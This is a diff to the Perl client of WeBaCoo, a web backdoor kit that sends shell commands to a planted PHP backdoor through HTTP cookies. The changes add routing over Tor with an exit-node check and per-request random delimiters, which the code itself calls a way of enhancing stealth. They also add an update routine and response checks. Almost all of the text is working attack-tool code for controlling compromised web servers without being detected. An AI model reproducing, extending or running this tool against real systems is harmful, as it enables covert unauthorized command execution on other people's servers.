@@ -6,6 +6,8 @@ use URI;
 use Getopt::Std;
 use MIME::Base64;
 use IO::Socket;
+use IO::Socket::Socks;
+use Term::ANSIColor qw(:constants);
 
 ## Variables ##
 my(%WEBACOO,%args);
@@ -15,7 +17,7 @@ my @phpsf = ("system", "shell_exec", "exec", "passthru", "popen");
 
 # Setup
 $WEBACOO{name} = "webacoo.pl";
-$WEBACOO{version} = '0.1.4';
+$WEBACOO{version} = '0.2';
 $WEBACOO{description} = 'Web Backdoor Cookie Script-Kit';
 $WEBACOO{author} = 'Anestis Bechtsoudis';
 $WEBACOO{email} = 'anestis@bechtsoudis.com';
@@ -23,8 +25,8 @@ $WEBACOO{website} = 'http(s)://bechtsoudis.com';
 $WEBACOO{twitter} = '@anestisb';
 $WEBACOO{sfuntion} = $phpsf[0]; 		# Default is system()
 $WEBACOO{agent} = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0.2) Gecko/20100101 Firefox/6.0.2";
-$WEBACOO{cookie} = "M-cookie";
-$WEBACOO{delim} = "wBc";			# Default delimiter
+$WEBACOO{cookie} = "M-cookie";			# Default cookie name
+$WEBACOO{delim} = '8zM$';			# Initialize delimiter
 $WEBACOO{url} = '';
 $WEBACOO{rhost} = '';
 $WEBACOO{rport} = '80';
@@ -32,6 +34,8 @@ $WEBACOO{uri} = '';
 $WEBACOO{proxy_ip} = '';
 $WEBACOO{proxy_port} = '';
 $WEBACOO{vlevel} = 0;				# Default verbose level=0
+$WEBACOO{tor_ip} = "127.0.0.1";			# Default tor ip
+$WEBACOO{tor_port} = "9050";			# Default tor port
 
 ## Help Global Variables ##
 my $command = '';
@@ -51,10 +55,12 @@ my @verdata = ();
 print_logo();
 
 # Parse command args
-getopts("gf:ro:tu:c:a:d:p:v:h", \%args) or die "getopts() returned 0\n";
+getopts("gf:ro:tu:c:a:d:p:v:h", \%args) or die "[-] Problem with the supplied arguments.\n";
 
+# Check for newer version & apply update
+if(defined $ARGV[0] && $ARGV[0] eq "update") { update(); }
 # Check for invalid arguments
-if($ARGV[0]) { print "[-] Invalid option:$ARGV[0]\n"; exit; }
+elsif(defined $ARGV[0]) { print "[-] Unknown option:$ARGV[0]\n"; exit; }
 
 # Print usage in -h case
 print_usage() if $args{h};
@@ -66,7 +72,7 @@ if(defined $args{g}) {
 
     # Check output filename
     if(!defined $args{o}) {
-        print "[-] No output file specified!\n";
+        print "[-] No output file specified.\n";
 	exit;
     }
 
@@ -74,7 +80,7 @@ if(defined $args{g}) {
     if(defined $args{f}) {
         if($args{f} =~ /^[1-5]$/) { $WEBACOO{sfuntion} = $phpsf[$args{f}-1]; }
 	else { 
-	    print "[-] -f $args{f}: Unknown function number!\n";
+	    print "[-] -f $args{f}: Unknown function number.\n";
 	    print "\nUse -h for help\n";
 	    exit;
 	}
@@ -91,7 +97,7 @@ if(defined $args{t}) {
 
     # Check URL
     if(!defined $args{u}) {
-	print "[-] No url specified!\n";
+	print "[-] No url specified.\n";
 	exit;
     }
 
@@ -108,7 +114,12 @@ if(defined $args{t}) {
     if(defined $args{c}) { $WEBACOO{cookie}=$args{c}; }
 
     # Check for user specified delimiter
-    if(defined $args{d}) { $WEBACOO{delim}=$args{d}; }
+    if(defined $args{d}) { 
+        $WEBACOO{delim}=$args{d};
+	print "[!] Delimiter will remain the same for every request.\n";
+	print "    Without the -d flag, a different random delimiter is used for each request,\n";
+        print "    enhancing stealth behavior.\n\n";
+    }
 
     # Delimiter cannot be equal to cookie name
     if(defined $args{d} && defined $args{c} && ($args{d} eq $args{c})) { 
@@ -119,29 +130,39 @@ if(defined $args{t}) {
     if(defined $args{v}) {
 	if($args{v} =~ /^[0-2]$/) { $WEBACOO{vlevel} = $args{v}; }
         else {
-            print "[-] -v $args{v}: Unknown verbosity level!\n";
+            print "[-] -v $args{v}: Unknown verbosity level.\n";
             print "\nUse -h for help\n";
             exit;
         }
     }
 
+    # If Tor check connectivity status
+    if(defined $args{p} && $args{p} eq "tor") { tor_check(); }
+    
     # Initial check & print user info
     $command="id";
-    print "[+] Connected to remote server as:\n";
-    cmd_request();
+    print "[+] Connecting to remote server as...\n";
+    if(defined $args{p} && $args{p} eq "tor") { tor_cmd_request(); }
+    else { cmd_request(); }
     print "\n";
 
     # Print quit help message
-    print "Type 'exit' to quit terminal!\n\n";
+    print "Type 'exit' to quit terminal.\n\n";
 
     # "Terminal" connection loop
     while(1) {
-        print "webacoo> ";
+        # Check if terminal before user interraction
+        if(-t STDOUT) { print BOLD,RED"webacoo",BLUE,'$ ',RESET; }
+	else { print '[-] Need to run under terminal.'; exit; }
     	chop($command=<STDIN>);
 
 	# Exit if "exit" is typed
-    	if($command eq "exit") { print "\n^Bye^\n"; last; }
-    	cmd_request("1");
+    	if($command eq "exit") { print "Bye...\n"; last; }
+
+	# If no user specified delimiter, set a new random one for each request
+	random_delim() if(!defined $args{d});
+    	if(defined $args{p} && $args{p} eq "tor") { tor_cmd_request("1"); }
+        else { cmd_request("1"); }
     }
 }
 
@@ -154,12 +175,39 @@ if(defined $args{t}) {
 # Print logo
 sub print_logo
 {
-print qq(
- WeBaCoo $WEBACOO{version} - $WEBACOO{description}
- Written by $WEBACOO{author} { $WEBACOO{twitter} | $WEBACOO{email} }
- $WEBACOO{website}
+    # Check if terminal for colored output
+    if(-t STDOUT) {
+    	print "\n",BLUE,BOLD,"\tWeBaCoo $WEBACOO{version}",RESET;
+    	print BLUE," - $WEBACOO{description}\n";
+    	print GREEN,"\tWritten by ",RESET,GREEN,BOLD,"$WEBACOO{author}\n",RESET;
+    	print GREEN,"\t{ ",YELLOW,"$WEBACOO{twitter} ",GREEN,"|",YELLOW," $WEBACOO{email} ";
+    	print GREEN,"|",YELLOW," $WEBACOO{website}",GREEN," }\n\n",RESET;
 
-);
+    	# Flush output buffer
+    	$|++;
+    }
+    else {
+	print "\n\tWeBaCoo $WEBACOO{version} - $WEBACOO{description}\n";
+        print "\tWritten by $WEBACOO{author}\n";
+        print "\t{ $WEBACOO{twitter} | $WEBACOO{email} | $WEBACOO{website} }\n\n";
+    }
+}
+
+#################################################################################
+# Update
+sub update
+{
+    # Search for project dir & git system command
+    if(-d "./.git/" && !system("which git > /dev/null")) {
+        print "[+] Checking for newer versions...\n";
+        system("git pull");
+        print "\n";
+    }
+    else {
+        print "[-] Error with git repository update.\n\n";
+        print "Download latest version from:\n";
+        print "https://github.com/anestisb/WeBaCoo/zipball/master\n\n";
+    }
 }
 
 #################################################################################
@@ -188,13 +236,13 @@ Options:
 
   -u URL	Backdoor URL
 
-  -c C_NAME	Cookie name (default "M-cookie")
+  -c C_NAME	Cookie name (default: "M-cookie")
 
-  -d DELIM	Delimiter (default "wBc")
+  -d DELIM	Delimiter (default: New random for each request)
 
   -a AGENT	HTTP header user-agent (default exist)
 
-  -p PROXY	Use proxy (IP:PORT or USER:PASS:IP:PORT)
+  -p PROXY	Use proxy (tor, ip:port or user:pass:ip:port)
 
   -v LEVEL	Verbose level
 	LEVEL
@@ -203,6 +251,8 @@ Options:
 		2: print HTTP headers + data
 
   -h		Display help and exit
+
+  update	Check for updates and apply if any
 );
 
 exit;
@@ -256,7 +306,7 @@ sub generate_backdoor
 }
 
 #################################################################################
-# Backdoor: send request & get response
+# Backdoor cmd: send request & get response
 sub cmd_request
 {
     # Silent flag
@@ -272,7 +322,7 @@ sub cmd_request
 	if(@pargs==2) { ($dst_host, $dst_port) = @pargs; }
 	elsif(@pargs==4) { ($proxy_user, $proxy_pass, $dst_host, $dst_port) = @pargs; }
 	else { 
-	    print "[-] Invalid Proxy arguments!\n"; 
+	    print "[-] Invalid Proxy arguments.\n"; 
 	    print "\nUse -h for help\n";
             exit; 
 	}
@@ -292,11 +342,11 @@ sub cmd_request
     print "*** Request HTTP Header ***\n$request" if($WEBACOO{vlevel} > 0 && $silent);
 
     # Establish connection
-    $sock=IO::Socket::INET->new(
-                                PeerAddr=> $dst_host,
-                                PeerPort => $dst_port,
-                                Proto => "tcp",
-                               );
+    $sock = IO::Socket::INET->new(
+                                  PeerAddr=> $dst_host,
+                                  PeerPort => $dst_port,
+                                  Proto => "tcp",
+                                 );
     # Error checking
     die "Could not create socket: $!\n" unless $sock;
 
@@ -310,6 +360,9 @@ sub cmd_request
     # Close socket
     close($sock);
 
+    # Unescape URI escaped special characters
+    $output =~ s/%([0-9A-Fa-f]{2})/chr(hex($1))/eg;
+
     # Split HTTP header + data and print according to verbose level
     @verdata = split (/^\r\n/m,$output);
     $verdata[1] = "" if (@verdata == 1); # If data field is empty
@@ -318,15 +371,18 @@ sub cmd_request
     print "*** Response HTTP Data ***\n$verdata[1]\n\n" if($WEBACOO{vlevel} > 1 && $silent);
     print "*** Command Output ***\n" if($WEBACOO{vlevel} > 0 && $silent);
 
-    # Unescape URI escaped special characters
-    $output =~ s/%([0-9A-Fa-f]{2})/chr(hex($1))/eg;
-
     # Check for HTTP 4xx error status codes
     if($output =~ m/^HTTP\/1\.[0,1].+4\d{2}.+\n/)
     {
 	print "\n[!] 4xx error server response.\n";
 	print "Terminal closed.\n";
 	exit ;
+    }
+
+    # Check if server responded with the correct cookie name
+    if($output !~ m/Set-Cookie: $WEBACOO{cookie}/) {
+        print "[-] Server has not responded with the expected cookie name.\n";
+        exit;
     }
 
     # Locate cookie data
@@ -342,7 +398,159 @@ sub cmd_request
     # Decode response and print output
     else { print decode_base64($output); }
 
-    # Flush content
+    # Flush content buffers
     @verdata = ();
     $output = '';
+}
+
+#################################################################################
+# Check Tor connectivity
+sub tor_check
+{
+    print "[!] Checking Tor connectivity...\n\n";
+
+    # Check Tor tcp socket
+    my $tor_sock = IO::Socket::INET->new(
+                                         PeerAddr => $WEBACOO{tor_ip},
+                                         PeerPort => $WEBACOO{tor_port},
+                                         Proto => "tcp",
+                                        );
+    if($tor_sock) { print "[+] TCP Socket is listening at $WEBACOO{tor_ip}:$WEBACOO{tor_port}\n"; }
+    else { 
+	print "[-] TCP Socket is not listening at $WEBACOO{tor_ip}:$WEBACOO{tor_port}\n\n"; 
+	print "    Program exited.\n"; 
+	exit;
+    }
+
+    # Hit whatismyip to find exit node ip
+    $sock = IO::Socket::Socks->new(
+				   ProxyAddr=>$WEBACOO{tor_ip},
+                                   ProxyPort=>$WEBACOO{tor_port},
+                                   ConnectAddr=>"98.207.221.49",
+                                   ConnectPort=>"80",
+                                  );
+    die "Could not create socks proxy socket: $!\n" unless $sock;
+
+    $request = "GET / HTTP/1.1\r\n";
+    $request .= "Host: whatismyip.org:80\r\n";
+    $request .= "\r\n";
+
+    print $sock $request;
+
+    my $line;
+    while ($line = <$sock>) { $output .= $line; }
+
+    if(defined $output) { print "[+] Tor connection established.\n"; }
+
+    # Check if ip is valid
+    if($output =~ m/([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})/)
+    {
+	print "Tor exit node: $1\n\n";
+    }
+
+    # Flush buffer & close socket
+    $output='';
+    close($sock);
+}
+
+#################################################################################
+# Backdoor cmd over tor: send request & get response
+sub tor_cmd_request
+{
+    # Silent flag
+    my $silent = @_;
+
+    # Form GET request
+    $request = "GET http://$WEBACOO{rhost}$WEBACOO{uri} HTTP/1.1\r\n";
+    $request .= "Host: $WEBACOO{rhost}:$WEBACOO{rport}\r\n";
+    $request .= "Agent: $WEBACOO{agent}\r\n";
+    $request .= "Connection: Close\r\n";
+    $request .= "Cookie: cm=".encode_base64($command,'').";".
+        " cn=$WEBACOO{cookie}; cp=$WEBACOO{delim}\r\n";
+    $request .= "\r\n";
+
+    # Print request if verbose level > 0
+    print "*** Request HTTP Header ***\n$request" if($WEBACOO{vlevel} > 0 && $silent);
+
+    # Connect to server via Tor
+    $sock = IO::Socket::Socks->new(
+                                   ProxyAddr=>$WEBACOO{tor_ip},
+                                   ProxyPort=>$WEBACOO{tor_port},
+                                   ConnectAddr=>$WEBACOO{rhost},
+                                   ConnectPort=>$WEBACOO{rport},
+                                  );
+    die "Could not create socks proxy socket: $!\n" unless $sock;
+
+    # Send GET request
+    print $sock $request;
+
+    # Get server response
+    my $line;
+    while ($line = <$sock>) { $output .= $line; }
+
+    # Close socket
+    close($sock);
+
+    # Unescape URI escaped special characters
+    $output =~ s/%([0-9A-Fa-f]{2})/chr(hex($1))/eg;
+
+    # Split HTTP header + data and print according to verbose level
+    @verdata = split (/^\r\n/m,$output);
+    $verdata[1] = "" if (@verdata == 1); # If data field is empty
+    chomp($verdata[0]);
+    print "*** Response HTTP Header ***\n$verdata[0]\n\n" if($WEBACOO{vlevel} > 0 && $silent);
+    print "*** Response HTTP Data ***\n$verdata[1]\n\n" if($WEBACOO{vlevel} > 1 && $silent);
+    print "*** Command Output ***\n" if($WEBACOO{vlevel} > 0 && $silent);
+
+    # Check for HTTP 4xx error status codes
+    if($output =~ m/^HTTP\/1\.[0,1].+4\d{2}.+\n/)
+    {
+        print "\n[!] 4xx error server response.\n";
+        print "Terminal closed.\n";
+        exit ;
+    }
+
+    # Check if server responded with the correct cookie name
+    if($output !~ m/Set-Cookie: $WEBACOO{cookie}/) { 
+	print "[-] Server has not responded with the expected cookie name.\n"; 
+	exit;
+    }
+
+    # Locate cookie data
+    my $start = index($output,$WEBACOO{delim})+length($WEBACOO{delim});
+    my $end = index($output,$WEBACOO{delim},$start);
+    $output = substr($output,$start,$end-$start);
+
+    # Check for disabled PHP system functions
+    if(!$output && $command eq "id") {
+        print "\n[-] Response cookie has no data.\n";
+        print "[!] Backdoor PHP system function possibly disabled.\n";
+    }
+    # Decode response and print output
+    else { print decode_base64($output); }
+
+    # Flush content buffers
+    @verdata = ();
+    $output = '';
+}
+
+#################################################################################
+# Randomize delimiter string
+sub random_delim
+{
+    # Base64 valid characters
+    my @vchars=('a'..'z','A'..'Z','0'..'9');
+    # Base64 non-valid characters
+    my @nvchars=('!','@','#','$','%','^','&','*','?','~');
+
+    # Flush delimiter
+    $WEBACOO{delim}='';
+
+    # Create new delimiter with 4 chars
+    # 3 valid + 1 non-valid
+    foreach (1..3)
+    {
+      $WEBACOO{delim}.=$vchars[rand @vchars];
+    }
+    $WEBACOO{delim}.=$nvchars[rand @nvchars];
 }
